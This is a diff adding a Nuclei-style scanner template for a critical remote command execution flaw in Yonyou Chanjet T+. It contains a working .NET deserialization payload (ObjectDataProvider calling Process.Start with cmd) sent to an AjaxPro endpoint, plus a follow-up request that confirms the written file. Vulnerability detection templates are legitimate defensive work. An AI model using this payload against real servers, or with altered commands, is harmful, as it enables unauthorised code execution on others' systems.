@@ -1,0 +1,70 @@
+id: yonyou-chanjet-tplus-rce
+info:
+  name: Yonyou Chanjet T+ Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yonyou Chanjet T+ has a remote command execution vulnerability allowing attackers to execute arbitrary commands on the target server.
+    This vulnerability is in the GetStoreWarehouseByStore method.
+  reference:
+    - https://www.chanjet.com
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.3
+  tags: rce
+
+variables:
+  rand_filename: '{{rand_text_alphanumeric(8)}}.txt'
+  rand_content: '{{rand_text_alphanumeric(10)}}'
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Content-Type: text/plain
+        Accept-Encoding: gzip, deflate
+        X-Ajaxpro-Method: GetStoreWarehouseByStore
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        {
+          "storeID": {
+            "__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
+            "MethodName": "Start",
+            "ObjectInstance": {
+              "__type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+              "StartInfo": {
+                "__type": "System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
+                "FileName": "cmd",
+                "Arguments": "/c echo {{rand_content}}> .\\temp\\{{rand_filename}}"
+              }
+            }
+          }
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /tplus/temp/{{rand_filename}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{rand_content}}"
